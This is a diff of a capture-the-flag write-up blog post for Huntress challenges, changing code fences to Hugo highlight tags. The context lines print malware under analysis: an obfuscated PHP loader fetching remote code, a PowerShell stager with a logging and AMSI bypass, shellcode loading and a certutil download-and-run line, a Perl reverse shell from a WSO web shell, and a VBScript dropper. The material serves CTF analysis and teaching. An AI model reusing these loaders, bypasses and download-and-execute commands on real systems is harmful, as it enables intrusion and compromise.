@@ -105,14 +105,14 @@ Moving through and checking the QRCode value, a text that appears to be the flag
 
 We are presented with a PHP file that seems to be obfuscated. This file contains two parts. The first part is a PHP code and the second part is a long string that looks like a reverse base64.
 
-```php
+{{< highlight php "lineNos=false" >}}
 <?php $L66Rgr=explode(base64_decode("Pz4="),file_get_contents(__FILE__)); $L6CRgr=array(base64_decode("L3gvaQ=="),base64_decode("eA=="),base64_decode(strrev(str_rot13($L66Rgr[1]))));$L7CRgr = "d6d666e70e43a3aeaec1be01341d9f9d";preg_replace($L6CRgr[0],serialize(eval($L6CRgr[2])),$L6CRgr[1]);exit();?>==Dstfmoz5JnxNvolIUqyWUV7xFXa0lWtbQVaD1Wt8QVcNQZlNQrjNvWtZKolITpxtPXtbQVcNlW4qPV6NlW0qPV/NFXjNwZjtUZtLPVm1zpyOUWbtPV/NFXkNQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlW3qPV/NFXlNQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlWlqPV/NFX0NQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xFXa0lWtbQVaZ1Wt8QVcNQZ0NQrjNvWtZKolITpxtPXtbQVcNlW4qPV6NlWmqPV/NFXjNQAjtUZtLPVm1zpyOUWbtPV/NFX4NQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlW3qPV/NFXjRQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlWlqPV/
 [...]
-```
+{{< /highlight >}}
 
 Reformating this code it produce a decoding routine.
 
-```php
+    {{< highlight php "lineNos=false" >}}
 <?php 
 $payload=explode(base64_decode("Pz4="),file_get_contents(__FILE__)); #get the variable by reading the file content and splitting on "?>"
 $payload=array(base64_decode("L3gvaQ=="),base64_decode("eA=="),base64_decode(strrev(str_rot13($payload[1])))); #payload[1] is corresponding to the long string and his decode using the routine : ROT13 -> Reverse -> B64 decode
@@ -120,20 +120,20 @@ $L7CRgr = "d6d666e70e43a3aeaec1be01341d9f9d";
 preg_replace($payload[0],serialize(eval($payload[2])),$payload[1]); #replacing the php code after execution
 exit();
 ?>
-```
+   {{< /highlight >}}
 
 By using Cyberchef we are able to replicate the routine and get the executed payload.
 
 ![Zerion](https://www.hato0.xyz/images/ctf/huntress/zerion.png)
 
-```html
+    {{< highlight html "lineNos=false" >}}
 function GC($a)
 {
     $url = sprintf('%s?api=%s&ac=%s&path=%s&t=%s', $a, $_REQUEST['api'], $_REQUEST['ac'], $_REQUEST['path'], $_REQUEST['t']); $code = @file_get_contents($url); if ($code == false) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_USERAGENT, 'll'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 100); curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); $code = curl_exec($ch); curl_close($ch); }return $code;}
 if (isset($_REQUEST['ac']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['t'])) { $code = GC('https://c.-wic5-.com/'); if(!$code){$code = GC('https://c.-oiv3-.com/?flag=flag{af10370d485952897d5183aa09e19883}
 ');}$need = 
 [...]
-```
+    {{< /highlight >}}
 
 And we can identify the flag.
 
@@ -165,9 +165,9 @@ So starting from there we will unzip ressources and perform a diff on it.
 
 To perform the diff we will use the following command : 
 
-```bash
+    {{< highlight bash "lineNos=false" >}}
 for i in ./*; do diff "$i" 0019de2359fe758b0c7cd04c361dfbb798a1d897f3e67de3756645b423dbfe3f; done
-```
+    {{< /highlight >}}
 
 We spot a line that looks different that the others : 
 
@@ -195,10 +195,10 @@ Using WinUHA we can extract the content of it and find a powershell script.
 The powershell file contains obfuscated command lines that we will need to decode.
 
 Original:
-```Powershell
+    {{< highlight powershell "lineNos=false" >}}
 C:\Windows\SysWOW64\cmd.exe /c powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c $x_wa3=((''Sc''+''{2}i''+''pt{1}loc{0}Logg''+''in''+''g'')-f''k'',''B'',''r'');If($PSVersionTable.PSVersion.Major -ge 3){ $sw=((''E''+''nable{3}''+''c{''+''1}''+''ip{0}Bloc{2}Logging''+'''')-f''t'',''r'',''k'',''S''); $p8=[Collections.Generic.Dictionary[string,System.Object]]::new(); $gG0=((''Ena''+''ble{2}c{5}i{3}t{''+''4}loc''+''{0}{1}''+''nv''+''o''+''cationLoggi''+''ng'')-f''k'',''I'',''S'',''p'',''B'',''r''); $jXZ4D=[Ref].Assembly.GetType(((''{0}y''+''s''+''tem.{1}a''+''n''+''a{4}ement.A{5}t''+''omati''+''on.{2''+''}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u'')); $plhF=[Ref].Assembly.GetType(((''{''+''6}{''+''5}stem.''+''{''+''3''+''}{9}''+''n{9}{''+''2}ement''+''.{''+''8}{''+''4}t{''+''7''+''}''+''m{9}ti{7}n''+''.''+''{8''+''}''+''m''+''si{0''+''}ti{''+''1}s'')-f''U'',''l'',''g'',''M'',''u'',''y'',''S'',''o'',''A'',''a'')); if ($plhF) { $plhF.GetField(((''''+''a{''+''0}''+''si{4}''+''nit{''+''1}''+''ai''+''l{2}{''+''3}'')-f''m'',''F'',''e'',''d'',''I''),''NonPublic,Static'').SetValue($null,$true); }; $lCj=$jXZ4D.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($lCj) { $a938=$lCj.GetValue($null); If($a938[$x_wa3]){ $a938[$x_wa3][$sw]=0; $a938[$x_wa3][$gG0]=0; } $p8.Add($gG0,0); $p8.Add($sw,0); $a938[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$x_wa3]=$p8; } Else { [Ref].Assembly.GetType(((''S{2}{3}''+''t''+''em''+''.Mana''+''ge''+''ment.{''+''5}{4}to''+''mation.Scr''+''ipt{1}loc{0}'')-f''k'',''B'',''y'',''s'',''u'',''A'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sI''+''AIeJ''+''G2UC/+1X''+''bU/jOBD+3l9hrS''+''IlkU{0}''+''VFvb{1}IiFdWqD''+''bPRJKS8vR''+''brUKy''+''TR168TFcQplb//7''+''jfNSygJ73{1}lI94F''+''IVvwyMx4/M''+''7YfT9PYl5TH''+''hH7sku8VUnxd''+''T3gRMTT/ku''+''/fWUSjS3Mzp''
 [...]
-```
+    {{< /highlight >}}
 
 We will only decrypt the interesting part with is the Base64 string passed to the GzipStream function.
 Using CyberChef we are able to reproduce the decryption routine : 
@@ -206,14 +206,14 @@ Using CyberChef we are able to reproduce the decryption routine :
 ![hotOfPress deobfuscate](https://www.hato0.xyz/images/ctf/huntress/hotOfPress3.png)
 
 We are presented with a new code snippet containing a new Base 64 to decode:
-```Powershell
+    {{< highlight powershell "lineNos=false" >}}
 [...]
 [Byte[]]$nLQ2k = [System.Convert]::FromBase64String("ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlcnR1dGlsIC11cmxjYWNoZSAtZiBodHRwOi8vLjEwMy4xNjMuMTg3LjEyOjgwODAvP2VuY29kZWRfZmxhZz0lNjYlNmMlNjElNjclN2IlNjQlNjIlNjYlNjUlMzUlNjYlMzclMzUlMzUlNjElMzglMzklMzglNjMlNjUlMzUlNjYlMzIlMzAlMzglMzglNjIlMzAlMzglMzklMzIlMzglMzUlMzAlNjIlNjYlMzclN2QgJVRFTVAlXGYgJiBzdGFydCAvQiAlVEVNUCVcZg==")
 [Uint32]$fal3 = 0
 $lc98 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll VirtualAlloc), (ma1_D @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $nLQ2k.Length,0x3000, 0x04)
 
 [...]
-```
+    {{< /highlight >}}
 
 The string extracted from that base64 is a powershell command : `certutil -urlcache -f http://.103.163.187.12:8080/?encoded_flag=%66%6c%61%67%7b%64%62%66%65%35%66%37%35%35%61%38%39%38%63%65%35%66%32%30%38%38%62%30%38%39%32%38%35%30%62%66%37%7d %TEMP%\f & start /B %TEMP%\f`.
 
@@ -356,7 +356,7 @@ Visiting this website we get a video running a *quite* taunting popular song.
 When this chall was released, some issue where seen on the instance, and a lot of incoherence has been seen, so we will only consider the things done in the stable part of the chall.
 
 Doing an nmap, we can find some open ports (nmap is allowed for this chall only).
-```bash
+    {{< highlight bash "lineNos=false" >}}
 Nmap scan report for 155.138.162.158.vultrusercontent.com (155.138.162.158)
 Host is up (0.14s latency).
 Not shown: 997 filtered ports
@@ -366,7 +366,7 @@ PORT     STATE SERVICE
 8888/tcp open  sun-answerbook
 
 Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds
-```
+    {{< /highlight >}}
 
 The SSH might be for Huntress staff to administrate the server, the port 80 is for the web service but the 8888 is quite surprising. 
 
@@ -378,7 +378,7 @@ Looking into it with telnet, got some nice lyrics and the flag !
 
 The challenge is to analyze a php file containing a base64 and a piece of code.
 The piece of code looks like that : 
-```php
+    {{< highlight php "lineNos=false" >}}
 <?php
 
 
@@ -403,10 +403,10 @@ $c = $k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "
 $c();
 
 /*TnaqRZZZJMyfalOgUHObXMPnnMIQvrNgBNUkiLwzwxlYWIDfMEsSyVVKkUfFBllcCgiYSrnTCcqLlZMXXuqDsYwbAVUpaZeRXtQGWQwhcAQrUknJCeHiFTpljQdRSGpz*/
-```
+   {{< /highlight >}}
 
 Putting the code in order looks like:
-```php
+    {{< highlight php "lineNos=false" >}}
 <?php
 function xorFunction($string, $key='') {
     $text = $string;
@@ -423,11 +423,11 @@ function xorFunction($string, $key='') {
 $encodedString = "LmQ9AT8aND16c2AcMh0lCS9BDFtTATklDzAoARAJCkl+NwQuLTE[...]"
 $c = create_function("/*XAjqgQvv4067*/", base64_decode(xorFunction(base64_decode($encodedString), "tVEwfwrN302")));
 $c();
-```
+   {{< /highlight >}}
 
 Creating this routine in CyberChef gives us the code of an php served web page. Only the last part is interesting: 
 
-```php
+    {{< highlight php "lineNos=false" >}}
 [...]
 function actionNetwork() {
 	wsoHeader();
@@ -436,10 +436,10 @@ function actionNetwork() {
 	echo "<h1>Network tools</h1><div class=content>
 	<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
 [...]
-```
+   {{< /highlight >}}
 
 By decoding the base64 we get two pieces of code, the most interesting one is this one :
-```php
+    {{< highlight php "lineNos=false" >}}
 #!/usr/bin/perl
 use Socket;
 $iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");
@@ -460,7 +460,7 @@ system('/bin/sh -i -c "echo ${string}; bash"');
 close(STDIN);
 close(STDOUT);
 close(STDERR)
-```
+   {{< /highlight >}}
 
 In there we can see a uuencoded strings that we need to decode and here is the flag ! 
 
@@ -476,13 +476,13 @@ Using dtmf we are able to extract the corresponding string.
 This looks like a long that we need to convert to strings.
 
 We can use the following code snippet : 
-```python
+    {{< highlight python "lineNos=false" >}}
 from Crypto.Util.number import long_to_bytes
 
 data = 13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573
 bytes = long_to_bytes(data)
 print(bytes)
-```
+    {{< /highlight >}}
 
 That return the flag !
 
@@ -593,11 +593,11 @@ We have a web page with a button calling the function `ctf()`.
 
 This function open a new window with a specific path :
 
-```javascript
+    {{< highlight javascript "lineNos=false" >}}
 function ctf() {
   window.open("./capture_the_flag.html", 'Capture The Flag', 'width=400,height=100%,menu=no,toolbar=no,location=no,scrollbars=yes');
 }
-```
+    {{< /highlight >}}
 
 Accessing directly to the page we get the flag ! 
 
@@ -616,7 +616,7 @@ We will from there try to decode the content. To do so we will use the program d
 
 I will not but the uncleaned code here to protect your eyes but here is a cleanup version :
 
-```VB
+    {{< highlight visualbasic "lineNos=false" >}}
 Set Object  = WScript.CreateObject("WScript.Shell") 
 Set SObject = CreateObject("Shell.Application")
 Set FObject = CreateObject("Scripting.FileSystemObject")
@@ -640,7 +640,7 @@ Next
 Sub Paste(RT)
 FObject.CopyFile RT,PathString
 End Sub
-```
+    {{< /highlight >}}
 
 The code perform an request to a `pastebin` then save the output to `July.htm` in the public document folder and execute it.
 Visiting the pastebin, the flag is the only content. 
